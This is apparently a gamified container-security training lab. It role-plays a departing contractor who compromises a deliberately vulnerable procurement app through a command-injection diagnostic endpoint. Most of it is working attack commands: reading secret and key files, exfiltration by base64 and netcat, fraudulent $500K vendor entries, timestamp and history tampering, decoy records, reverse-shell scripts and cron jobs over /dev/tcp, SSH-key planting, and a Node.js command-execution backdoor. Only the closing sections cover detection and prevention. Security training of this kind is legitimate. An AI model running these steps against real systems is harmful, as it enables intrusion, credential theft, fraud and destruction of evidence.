# VendorQuote Attack Lab - Gamified Edition

**A CrowdStrike Container Security Training Challenge**

---

## 🎮 Mission Briefing

You are **John Doe**, a procurement contractor (username: `contractor-jdoe`) who just learned your contract won't be renewed. Your access expires in 72 hours.

### 💰 Your Ultimate Goal: The $500K Heist

**Primary Objective:** Execute a fraudulent procurement scheme by:
1. Creating a backdoor for persistent access
2. Approving a fake $500,000 vendor quote to your shell company "ACME Consulting LLC"
3. Exfiltrating sensitive pricing data to sell to competitors
4. Stealing payment card data from vendor records
5. Covering your tracks to avoid detection

**Success Criteria:** Complete all 7 phases and achieve the final objective without triggering security alerts.

**Total Points Available:** 1000 points

---

## 🎯 Phase 1: Reconnaissance (100 points)

### Objective 1.1: Map the Application (30 points)

**Mission:** Discover all available endpoints and functionality in the VendorQuote application.

**Success Criteria:** Document at least 5 different URLs/endpoints

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner (Click to expand)</summary>

Open your web browser and navigate to the target application:
```
http://[TARGET_IP]
```

Click through all the navigation menu items and note what you find.

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Look for:
- Main dashboard
- Quotes page
- Approvals page
- Support/diagnostic tools
- API endpoints

From Kali, you can also enumerate with curl:
```bash
curl http://[TARGET_IP]
curl http://[TARGET_IP]/healthz
curl http://[TARGET_IP]/api/
```

</details>

<details>
<summary>✅ Solution</summary>

**Available Endpoints:**
- `GET /` - Dashboard
- `GET /quotes` - Vendor pricing data
- `GET /approvals` - Discount approvals
- `GET /support` - Diagnostic tools
- `POST /api/support/diag` - Diagnostic API (⚠️ Interesting!)
- `GET /healthz` - Health check

**Key Finding:** The `/support` page contains a diagnostic tool that might be exploitable!

</details>

---

### Objective 1.2: Identify Your Target Data (40 points)

**Mission:** Locate where sensitive pricing and payment data is stored.

**Success Criteria:** Find at least 3 references to sensitive files or data locations

**Attack Platform:** Windows Browser (explore the UI) OR Kali Linux (recon)

<details>
<summary>💡 Hint - Beginner</summary>

Navigate to the "Quotes" page in your browser. What kind of data do you see? Look for column headers that mention payment methods or pricing.

Also check the "Support" page - are there any example commands listed?

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

The support diagnostics page shows "Common Diagnostic Commands" in a table. These commands might give you clues about the system structure.

From Kali, you could try to curl the quotes page and look for data references:
```bash
curl http://[TARGET_IP]/quotes | grep -i "data\|file\|csv"
```

</details>

<details>
<summary>✅ Solution</summary>

**Sensitive Data Locations Discovered:**
- Vendor pricing with payment card data (visible in `/quotes` page)
- Discount exception approvals (visible in `/approvals` page)
- References to CSV files in `/app/data/` directory
- Configuration files likely in `/app/config/`

**Points Earned:** 40 points 🎯

</details>

---

### Objective 1.3: Test for Remote Code Execution (30 points)

**Mission:** Verify if the diagnostic tool allows command execution.

**Success Criteria:** Successfully execute a harmless command and see the output

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

**From Windows Browser:**
1. Go to `http://[TARGET_IP]/support`
2. In the "Diagnostic Note" text area, type: `hostname`
3. Click "Run Diagnostic"
4. Look at the output

**From Kali:**
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"hostname"}'
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Try different commands to understand what's possible:
- `hostname` - Get the container name
- `whoami` - See what user you're running as
- `pwd` - See current directory
- `id` - Get full user context

</details>

<details>
<summary>✅ Solution</summary>

**Successful RCE Confirmed!** ✅

The diagnostic tool executes arbitrary commands. Example:

```bash
# Windows: Enter in support page
whoami

# Kali: Via API
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"whoami"}'
```

**Output:** `root`

**Critical Finding:** The container is running as root! This is a major security issue.

**Points Earned:** 30 points 🎯
**Phase 1 Complete:** 100/100 points! 🏆

</details>

---

## 🔓 Phase 2: Initial Access & Enumeration (150 points)

### Objective 2.1: Enumerate the File System (50 points)

**Mission:** Map out the application directory structure and find sensitive files.

**Success Criteria:** Locate at least 5 sensitive files (configs, keys, data files)

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Use the diagnostic tool to list files in the application directory:

**Windows Browser (Support page):**
```bash
ls -la /app
```

**Kali Linux:**
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"ls -la /app"}'
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Look for configuration and data directories:
```bash
# List all subdirectories
ls -la /app/config/
ls -la /app/keys/
ls -la /app/data/
ls -la /app/backup/

# Find all JSON and PEM files
find /app -type f \( -name "*.json" -o -name "*.env" -o -name "*.pem" \)
```

</details>

<details>
<summary>✅ Solution</summary>

**Sensitive Files Discovered:**

```bash
# Execute this command:
find /app -type f \( -name "*.json" -o -name "*.env" -o -name "*.pem" -o -name "*.csv" -o -name "*.sql" \)
```

**Found:**
- `/app/config/.env` - Environment variables (likely secrets)
- `/app/config/gcp-service-account.json` - GCP credentials
- `/app/config/slack.json` - Slack API token
- `/app/keys/vendorquote-internal.pem` - Private key
- `/app/data/vendor_pricing_2026.csv` - Pricing data
- `/app/data/discount_exceptions.csv` - Approval data
- `/app/data/procurement_notes.txt` - Unstructured data
- `/app/backup/vendorquote-backup.sql` - Database backup

**Points Earned:** 50 points 🎯

</details>

---

### Objective 2.2: Extract Environment Secrets (50 points)

**Mission:** Retrieve all secrets from environment variables and config files.

**Success Criteria:** Extract at least 3 different types of credentials

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Use the `cat` command to read file contents:

**Windows Browser:**
```bash
cat /app/config/.env
```

**Kali:**
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/.env"}'
```

Also try:
```bash
env
```
to see environment variables.

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Extract multiple secret files:

```bash
# Environment file
cat /app/config/.env

# GCP service account
cat /app/config/gcp-service-account.json

# Slack token
cat /app/config/slack.json

# Private key
cat /app/keys/vendorquote-internal.pem

# All environment variables
env | grep -i "key\|token\|secret\|password"
```

</details>

<details>
<summary>✅ Solution</summary>

**Secrets Extracted:**

1. **Environment Variables (.env file):**
   - Database credentials
   - API keys
   - JWT secrets
   - AWS credentials

2. **GCP Service Account:**
   - Full service account JSON with private key
   - Project ID
   - Client email

3. **Slack Integration:**
   - Webhook URL
   - Bot token
   - Channel IDs

4. **Private Key:**
   - RSA private key for internal services

**Save this data locally for Phase 6!**

**Points Earned:** 50 points 🎯

</details>

---

### Objective 2.3: Locate Payment Card Data (50 points)

**Mission:** Find and extract credit card and payment information from vendor records.

**Success Criteria:** Retrieve the vendor pricing CSV file containing payment data

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

You found a file earlier: `/app/data/vendor_pricing_2026.csv`

Read it using:
```bash
cat /app/data/vendor_pricing_2026.csv
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Search for payment-related data:

```bash
# View the pricing file
cat /app/data/vendor_pricing_2026.csv

# Search for credit card or payment info
cat /app/data/vendor_pricing_2026.csv | grep -i "credit\|card\|payment\|bank"

# View all data files
cat /app/data/*.csv
cat /app/data/*.txt
```

</details>

<details>
<summary>✅ Solution</summary>

**PCI Data Found!**

```bash
# Execute:
cat /app/data/vendor_pricing_2026.csv
```

**Contains:**
- Vendor names and contact info
- Payment methods (credit cards, ACH)
- Bank account numbers
- Payment card numbers (last 4 digits)
- Payment routing information
- Contract values and pricing

**Compliance Violation:** This is PCI DSS scope data stored in plain text!

**Points Earned:** 50 points 🎯
**Phase 2 Complete:** 150/150 points! 🏆

</details>

---

## 🎭 Phase 3: Establish Persistence (100 points)

### Objective 3.1: Create a Backdoor Account (100 points)

**Mission:** Add a persistent backdoor to the discount exceptions file so you can approve fraudulent quotes later.

**Success Criteria:** Modify the discount_exceptions.csv file to pre-approve your shell company

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

You need to add a new line to the discount exceptions file. First, view it:

```bash
cat /app/data/discount_exceptions.csv
```

Then append your fraudulent entry:
```bash
echo "NEW_LINE_HERE" >> /app/data/discount_exceptions.csv
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

The CSV format appears to be:
```
Date,Vendor,Reason,Discount,Status,Approver
```

Create an entry that pre-approves your fake company "ACME Consulting LLC":

```bash
# First, back up the original
cp /app/data/discount_exceptions.csv /tmp/backup.csv

# Add your backdoor approval
echo "2026-12-31,ACME Consulting LLC,Special Partner,100%,PRE-APPROVED,contractor-jdoe" >> /app/data/discount_exceptions.csv

# Verify it was added
tail -n 5 /app/data/discount_exceptions.csv
```

</details>

<details>
<summary>✅ Solution</summary>

**Backdoor Created Successfully!** ✅

**Windows Browser (Support page):**
```bash
echo "2026-12-31,ACME Consulting LLC,Strategic Partnership,100%,PRE-APPROVED,contractor-jdoe" >> /app/data/discount_exceptions.csv
```

**Kali Linux:**
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"echo \"2026-12-31,ACME Consulting LLC,Strategic Partnership,100%,PRE-APPROVED,contractor-jdoe\" >> /app/data/discount_exceptions.csv"}'
```

**Verify:**
```bash
tail /app/data/discount_exceptions.csv
```

**Impact:** You now have a pre-approved 100% discount for your shell company! This enables the $500K fraud in Phase 6.

**Points Earned:** 100 points 🎯
**Phase 3 Complete:** 100/100 points! 🏆

</details>

---

## 📡 Phase 4: Data Exfiltration (200 points)

### Objective 4.1: Exfiltrate Credentials via Base64 (70 points)

**Mission:** Extract the GCP service account key in a format you can save locally.

**Success Criteria:** Successfully encode and exfiltrate the JSON credentials

**Attack Platform:** Windows Browser (preferred) OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Use base64 encoding to make the file easier to copy/paste:

**Windows Browser:**
```bash
base64 /app/config/gcp-service-account.json
```

Copy the output, then on your local machine decode it:
```bash
# Linux/Mac
echo "BASE64_STRING" | base64 -d > stolen-gcp-key.json

# Windows PowerShell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING")) > stolen-gcp-key.json
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

**From Kali, automate the extraction:**

```bash
# Get base64 encoded
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"base64 /app/config/gcp-service-account.json"}' \
  | jq -r '.output' | base64 -d > stolen-gcp-key.json

# Verify the file
cat stolen-gcp-key.json | jq
```

</details>

<details>
<summary>✅ Solution</summary>

**Credentials Exfiltrated!** ✅

**Method 1 - Windows Browser:**
1. In Support page: `base64 /app/config/gcp-service-account.json`
2. Copy the base64 output
3. Decode locally and save

**Method 2 - Kali (One-liner):**
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"base64 -w 0 /app/config/gcp-service-account.json"}' \
  | jq -r '.output' | base64 -d > stolen-gcp-key.json
```

**What You Now Have:**
- Full GCP service account with private key
- Project access credentials
- Potential access to cloud resources

**Points Earned:** 70 points 🎯

</details>

---

### Objective 4.2: Exfiltrate Pricing Data (70 points)

**Mission:** Steal the vendor pricing CSV to sell to competitors.

**Success Criteria:** Extract the complete vendor_pricing_2026.csv file

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Same technique - encode and exfiltrate:

```bash
base64 /app/data/vendor_pricing_2026.csv
```

Copy the output and decode locally.

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

**Kali - Direct exfiltration:**

```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"base64 -w 0 /app/data/vendor_pricing_2026.csv"}' \
  | jq -r '.output' | base64 -d > stolen-pricing-data.csv
```

Verify:
```bash
head stolen-pricing-data.csv
wc -l stolen-pricing-data.csv
```

</details>

<details>
<summary>✅ Solution</summary>

**Pricing Data Stolen!** ✅

```bash
# Kali one-liner
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/data/vendor_pricing_2026.csv"}' \
  | jq -r '.output' > stolen-pricing-data.csv
```

**Value of Stolen Data:**
- Complete vendor pricing for 2026
- Competitive intelligence
- Payment card information
- Bank account details

**Black Market Value:** $50,000 - $100,000 💰

**Points Earned:** 70 points 🎯

</details>

---

### Objective 4.3: Advanced Exfiltration via Netcat (60 points)

**Mission:** Use netcat to exfiltrate data over the network (stealth technique).

**Success Criteria:** Successfully transfer a file from the container to your Kali machine

**Attack Platform:** Kali Linux (Required)

<details>
<summary>💡 Hint - Beginner</summary>

**Step 1:** Set up a listener on your Kali machine:
```bash
nc -lvnp 4444 > exfiltrated-secrets.txt
```

**Step 2:** Send data from the container:
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/.env | nc [YOUR_KALI_IP] 4444"}'
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Check if netcat is available:
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"which nc"}'
```

If available, exfiltrate multiple files:

**Terminal 1 (Kali):**
```bash
nc -lvnp 4444 > exfil.tar.gz
```

**Terminal 2 (Kali):**
```bash
# Tar and send all sensitive data
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"tar czf - /app/config /app/keys /app/data | nc [YOUR_KALI_IP] 4444"}'
```

</details>

<details>
<summary>✅ Solution</summary>

**Network Exfiltration Complete!** ✅

```bash
# Kali Terminal 1 - Listener
nc -lvnp 4444 > all-secrets.tar.gz

# Kali Terminal 2 - Trigger exfiltration
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"tar czf - /app/config /app/keys /app/data 2>/dev/null | nc [YOUR_KALI_IP] 4444"}'

# Extract on Kali
tar xzf all-secrets.tar.gz
```

**Why This Matters:**
- Bypasses many security controls
- Works even if HTTP egress is blocked
- Can exfiltrate large datasets
- Harder to detect than HTTP transfers

**Points Earned:** 60 points 🎯
**Phase 4 Complete:** 200/200 points! 🏆

</details>

---

## 💸 Phase 5: Execute the Fraud (150 points)

### Objective 5.1: Create Fraudulent Vendor Entry (75 points)

**Mission:** Add your shell company "ACME Consulting LLC" to the vendor pricing database with a $500,000 quote.

**Success Criteria:** Successfully add a new vendor entry with your company

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

First, check the format of the vendor pricing CSV:

```bash
head -n 5 /app/data/vendor_pricing_2026.csv
```

Then add your fraudulent entry using the same format.

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Create a realistic vendor entry:

```bash
# View current format
head -n 1 /app/data/vendor_pricing_2026.csv

# Add your shell company
echo "2026-12-31,ACME Consulting LLC,john.doe@acmeconsult.com,Cloud Infrastructure Services,500000.00,ACH,99887766,PRE-APPROVED,contractor-jdoe,Strategic partnership discount applied" >> /app/data/vendor_pricing_2026.csv

# Verify
tail /app/data/vendor_pricing_2026.csv
```

</details>

<details>
<summary>✅ Solution</summary>

**Fraudulent Vendor Added!** ✅

**Windows Browser (Support page):**
```bash
echo "2026-12-31,ACME Consulting LLC,john.doe@acmeconsult.com,Cloud Infrastructure Modernization,500000.00,ACH,99887766,PRE-APPROVED,contractor-jdoe,Strategic partnership - 100% discount approved" >> /app/data/vendor_pricing_2026.csv
```

**Kali:**
```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"echo \"2026-12-31,ACME Consulting LLC,john.doe@acmeconsult.com,Cloud Infrastructure,500000.00,ACH,99887766,PRE-APPROVED,contractor-jdoe,Strategic partnership\" >> /app/data/vendor_pricing_2026.csv"}'
```

**The Setup:**
- $500,000 contract value
- Your shell company as vendor
- Pre-approved status (thanks to Phase 3!)
- Your email for payment notifications
- Your ACH account number

**Points Earned:** 75 points 🎯

</details>

---

### Objective 5.2: Modify Approval Workflow (75 points)

**Mission:** Change the approval status from "PENDING" to "APPROVED" for maximum discount on your fraudulent quote.

**Success Criteria:** Verify your ACME Consulting entry shows as fully approved

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Check both files to ensure everything is aligned:

```bash
# Check discount exceptions
grep "ACME Consulting" /app/data/discount_exceptions.csv

# Check vendor pricing
grep "ACME Consulting" /app/data/vendor_pricing_2026.csv
```

If anything says "PENDING", change it to "APPROVED" or "PRE-APPROVED"

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Use sed to modify entries in place:

```bash
# Backup first
cp /app/data/discount_exceptions.csv /tmp/discount_backup.csv
cp /app/data/vendor_pricing_2026.csv /tmp/pricing_backup.csv

# Change any PENDING to APPROVED
sed -i 's/PENDING/APPROVED/g' /app/data/discount_exceptions.csv
sed -i 's/PENDING/APPROVED/g' /app/data/vendor_pricing_2026.csv

# Verify changes
grep "ACME Consulting" /app/data/*.csv
```

</details>

<details>
<summary>✅ Solution</summary>

**Approval Workflow Bypassed!** ✅

```bash
# Verify your entries are approved
grep -i "ACME" /app/data/discount_exceptions.csv
grep -i "ACME" /app/data/vendor_pricing_2026.csv
```

**Expected Output:**
- Discount Exception: `PRE-APPROVED` or `APPROVED`
- Vendor Pricing: `PRE-APPROVED` status

**The Fraud is Complete!**

Your fake company:
- ✅ Has a $500,000 contract in the system
- ✅ Has 100% discount pre-approved
- ✅ Payment routing to your ACH account
- ✅ All approvals show as completed
- ✅ Your contractor username as approver

**Real-World Impact:**
- $500,000 fraudulent payment will be processed
- All audit trails point to legitimate approvals
- Financial loss + compliance violations

**Points Earned:** 75 points 🎯
**Phase 5 Complete:** 150/150 points! 🏆

</details>

---

## 🕵️ Phase 6: Covering Your Tracks (150 points)

### Objective 6.1: Timestamp Manipulation (50 points)

**Mission:** Change file modification times to hide evidence of tampering.

**Success Criteria:** Successfully backdate file modifications to before your access

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Use the `touch` command to change file timestamps:

```bash
# Change to a date before you had access
touch -t 202601010000 /app/data/discount_exceptions.csv
touch -t 202601010000 /app/data/vendor_pricing_2026.csv
```

The format is: YYYYMMDDHHmm

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Change timestamps on all modified files:

```bash
# Set to January 1, 2026 (before your modifications)
touch -t 202601010000 /app/data/discount_exceptions.csv
touch -t 202601010000 /app/data/vendor_pricing_2026.csv

# Verify the changes
ls -la /app/data/*.csv

# Also change backup files if you created them
touch -t 202601010000 /tmp/*.csv
```

</details>

<details>
<summary>✅ Solution</summary>

**Timestamps Manipulated!** ✅

```bash
# Backdate all modified files
touch -t 202601010000 /app/data/discount_exceptions.csv
touch -t 202601010000 /app/data/vendor_pricing_2026.csv

# Verify
ls -la /app/data/
```

**Anti-Forensics:**
- Files now show modification dates before your access
- Makes timeline analysis harder
- Obscures when fraud occurred

**Defender Note:** Good security tools track file integrity with checksums and maintain immutable audit logs that can't be modified this way.

**Points Earned:** 50 points 🎯

</details>

---

### Objective 6.2: Clear Command History (50 points)

**Mission:** Remove evidence of your malicious commands from shell history.

**Success Criteria:** Clear bash history and disable history logging

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Check if there's a bash history file:

```bash
# Check for history file
ls -la ~/.*history

# If exists, clear it
cat /dev/null > ~/.bash_history

# Disable history for this session
unset HISTFILE
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Clear all traces:

```bash
# View current history
history

# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Disable history
unset HISTFILE
export HISTSIZE=0

# Clear any other history files
rm -f ~/.sh_history ~/.zsh_history

# Check what's left
ls -la ~/.*history
```

</details>

<details>
<summary>✅ Solution</summary>

**Command History Cleared!** ✅

```bash
# Full cleanup
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE
export HISTSIZE=0
rm -f ~/.sh_history ~/.zsh_history
```

**Limitation:**
- Container logs may still show commands
- Application logs track API requests
- Network logs show connections
- Good monitoring tools (like CrowdStrike Falcon) capture at kernel level before history is written

**Points Earned:** 50 points 🎯

</details>

---

### Objective 6.3: Create Plausible Deniability (50 points)

**Mission:** Make your actions look like legitimate work by adding "normal" entries around your fraud.

**Success Criteria:** Add 2-3 legitimate-looking vendor entries to camouflage your ACME entry

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Add some legitimate-looking vendor entries before and after your fraudulent one:

```bash
# Add decoy entries
echo "2026-11-15,Cisco Systems,partner@cisco.com,Network Equipment,75000.00,NET30,APPROVED,contractor-jdoe,Regular approval" >> /app/data/vendor_pricing_2026.csv

echo "2026-12-20,Microsoft Corporation,vendor@microsoft.com,Software Licenses,120000.00,ACH,APPROVED,contractor-jdoe,Annual licensing" >> /app/data/vendor_pricing_2026.csv
```

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

Create a realistic pattern:

```bash
# Add several legitimate entries
echo "2026-11-15,Cisco Systems,partner@cisco.com,Network Equipment,75000.00,NET30,APPROVED,contractor-jdoe,Regular vendor approval" >> /app/data/vendor_pricing_2026.csv

echo "2026-12-01,Oracle Corporation,sales@oracle.com,Database Licensing,95000.00,ACH,APPROVED,contractor-jdoe,Annual renewal" >> /app/data/vendor_pricing_2026.csv

# Your fraudulent entry is here (already added)

echo "2027-01-10,Dell Technologies,quotes@dell.com,Server Hardware,82000.00,NET30,APPROVED,contractor-jdoe,Standard procurement" >> /app/data/vendor_pricing_2026.csv

# Sort the file by date to blend it in
sort -t',' -k1 /app/data/vendor_pricing_2026.csv > /tmp/sorted.csv
cat /tmp/sorted.csv > /app/data/vendor_pricing_2026.csv
```

</details>

<details>
<summary>✅ Solution</summary>

**Plausible Deniability Created!** ✅

```bash
# Add decoy legitimate vendors
echo "2026-11-15,Cisco Systems,partner@cisco.com,Network Equipment,75000.00,ACH,APPROVED,contractor-jdoe,Regular vendor" >> /app/data/vendor_pricing_2026.csv
echo "2026-12-01,Microsoft,vendor@microsoft.com,Software Licenses,120000.00,ACH,APPROVED,contractor-jdoe,Annual license" >> /app/data/vendor_pricing_2026.csv
echo "2027-01-10,AWS,billing@amazon.com,Cloud Services,85000.00,ACH,APPROVED,contractor-jdoe,Infrastructure" >> /app/data/vendor_pricing_2026.csv

# Verify your fraud is buried
wc -l /app/data/vendor_pricing_2026.csv
grep -n "ACME" /app/data/vendor_pricing_2026.csv
```

**Why This Helps:**
- Your fraudulent entry is now one of many
- Shows you were doing "normal" work
- Makes auditors less likely to focus on one entry
- Creates reasonable doubt ("I approved many vendors that day")

**Points Earned:** 50 points 🎯
**Phase 6 Complete:** 150/150 points! 🏆

</details>

---

## 🎯 Phase 7: Final Objective (150 points)

### Objective 7.1: Establish Persistent Backdoor (150 points)

**Mission:** Create a persistent backdoor for continued access after your contractor account is disabled.

**Success Criteria:** Implement a mechanism for future access to the container

**Attack Platform:** Windows Browser OR Kali Linux

<details>
<summary>💡 Hint - Beginner</summary>

Simple backdoor - Add a secondary diagnostic endpoint by modifying application files:

```bash
# First, see if you can modify the server code
ls -la /app/server.js

# View the file
cat /app/server.js | head -50
```

Can you add a hidden endpoint?

</details>

<details>
<summary>💡 Hint - Intermediate</summary>

**Option 1: Reverse Shell Script**

Create a script that connects back to you:

```bash
# Create reverse shell script
cat > /tmp/backdoor.sh << 'EOF'
#!/bin/bash
while true; do
  bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1
  sleep 300
done
EOF

chmod +x /tmp/backdoor.sh

# Start it in background
nohup /tmp/backdoor.sh &
```

**Option 2: Cron Job (if cron exists)**

```bash
# Add to crontab
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1'" >> /var/spool/cron/crontabs/root
```

</details>

<details>
<summary>💡 Hint - Advanced</summary>

**Option 3: Modify Server Code**

Add a hidden endpoint to the server:

```bash
# Backup original
cp /app/server.js /tmp/server.js.backup

# View current endpoints
grep -n "if (req.url" /app/server.js

# Add your backdoor endpoint (example location)
# You'll need to insert this into server.js at the right place
cat >> /tmp/backdoor_endpoint.txt << 'EOF'
  } else if (req.url === '/health-check-internal' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      const cmd = JSON.parse(body).cmd;
      require('child_process').exec(cmd, (err, stdout) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ result: stdout }));
      });
    });
  }
EOF
```

**Option 4: SSH Key Backdoor**

```bash
# Check if SSH is running
ps aux | grep sshd

# If so, add your SSH key
mkdir -p /root/.ssh
echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

</details>

<details>
<summary>✅ Solution</summary>

**Backdoor Established!** ✅

**Method 1: Hidden Diagnostic Endpoint (Safest)**

```bash
# Create a secondary hidden endpoint file
cat > /app/backdoor.js << 'EOF'
const http = require('http');
const { exec } = require('child_process');

const server = http.createServer((req, res) => {
  if (req.url === '/system-health' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      const cmd = JSON.parse(body).cmd;
      exec(cmd, (err, stdout, stderr) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ output: stdout || stderr }));
      });
    });
  }
});

server.listen(8888);
EOF

# Start backdoor server
nohup node /app/backdoor.js > /dev/null 2>&1 &
```

**Test your backdoor:**
```bash
# From Kali
curl -X POST http://[TARGET_IP]:8888/system-health \
  -H 'Content-Type: application/json' \
  -d '{"cmd":"whoami"}'
```

**Method 2: Persistence via Modified Data**

Even simpler - your modifications to the CSV files are persistent! As long as the container runs, your fraudulent entries remain.

```bash
# Verify persistence
grep "ACME" /app/data/vendor_pricing_2026.csv
grep "ACME" /app/data/discount_exceptions.csv
```

**Why This Matters:**
- Container restart won't remove file changes
- Your fraud persists until someone manually audits the files
- You can continue to add entries using the original diagnostic tool

**Points Earned:** 150 points 🎯
**Phase 7 Complete:** 150/150 points! 🏆

</details>

---

## 🏆 Mission Complete!

### 🎯 Final Score Calculation

| Phase | Points | Status |
|-------|--------|--------|
| Phase 1: Reconnaissance | 100 | ✅ |
| Phase 2: Initial Access | 150 | ✅ |
| Phase 3: Establish Persistence | 100 | ✅ |
| Phase 4: Data Exfiltration | 200 | ✅ |
| Phase 5: Execute the Fraud | 150 | ✅ |
| Phase 6: Covering Tracks | 150 | ✅ |
| Phase 7: Final Objective | 150 | ✅ |
| **TOTAL** | **1000** | **🏆** |

---

## 🎓 What You Accomplished

### The $500K Heist - Complete! 💰

**Your Attack Chain:**
1. ✅ Discovered vulnerable diagnostic endpoint (RCE)
2. ✅ Enumerated file system and found sensitive data
3. ✅ Extracted credentials, API keys, and PCI data
4. ✅ Created persistent backdoor in approval system
5. ✅ Exfiltrated vendor pricing data (worth $50-100K)
6. ✅ Added fraudulent $500K vendor quote for your shell company
7. ✅ Pre-approved maximum discount (100%)
8. ✅ Modified approval workflow to bypass controls
9. ✅ Covered tracks with timestamp manipulation
10. ✅ Established persistent backdoor for future access

**Total Financial Impact:**
- **Direct Fraud:** $500,000 fraudulent payment
- **Data Breach:** $50,000-$100,000 (stolen pricing data)
- **Stolen Credentials:** Priceless (cloud account access)
- **Compliance Fines:** Millions (PCI DSS violations)

---

## 🛡️ How CrowdStrike Falcon Would Have Stopped This

### Detection Points

**1. Container Image Assessment (Pre-Runtime)**
- ❌ Image running as root (UID 0)
- ❌ Embedded secrets in image layers
- ❌ Privileged port exposure (port 80)
- ❌ Vulnerable base image (Node.js 16)
- ❌ SUID binaries present

**Outcome:** Image would be flagged as high-risk before deployment

**2. Runtime Detection (During Attack)**

| Your Action | Falcon Detection |
|-------------|------------------|
| Execute `whoami` command | Suspicious command in container |
| Execute `find` to search files | Enumeration behavior detected |
| Read `/app/config/.env` | Access to sensitive files |
| Base64 encode secrets | Data exfiltration technique |
| Modify CSV files | Unauthorized file modification |
| Netcat data transfer | Unexpected network connection |
| Timestamp manipulation | Anti-forensics behavior |

**Outcome:** Multiple behavioral alerts, automatic response triggered

**3. Drift Detection**
- ✅ Modified application files detected
- ✅ New processes (backdoor server) flagged
- ✅ Changed file checksums alerted

**4. Network Detection**
- ✅ Outbound netcat connection to Kali IP
- ✅ DNS exfiltration attempts
- ✅ Connection to attacker infrastructure

**Outcome:** Container automatically quarantined, network blocked

---

## 📚 Key Lessons Learned

### Why This Attack Succeeded

1. **Command Injection Vulnerability**
   - Unsanitized user input passed to `child_process.exec()`
   - No input validation on diagnostic tool

2. **Running as Root**
   - Container UID 0 = maximum privileges
   - No privilege restrictions

3. **Embedded Secrets**
   - Credentials stored in image layers
   - Plain text configuration files
   - No secrets management solution

4. **No Runtime Security**
   - No behavioral monitoring
   - No file integrity monitoring
   - No network egress controls

5. **Excessive Permissions**
   - Container has unnecessary tools (netcat, curl, wget)
   - Writable file system
   - No AppArmor/SELinux

### How to Prevent This Attack

✅ **Never run containers as root** - Use `USER` directive in Dockerfile
✅ **Scan images before deployment** - CrowdStrike Image Assessment
✅ **Remove secrets from images** - Use Kubernetes secrets or vault
✅ **Implement runtime security** - CrowdStrike Falcon Container Sensor
✅ **Input validation** - Never trust user input, use parameterized commands
✅ **Network segmentation** - Restrict egress, block unnecessary ports
✅ **File integrity monitoring** - Detect unauthorized modifications
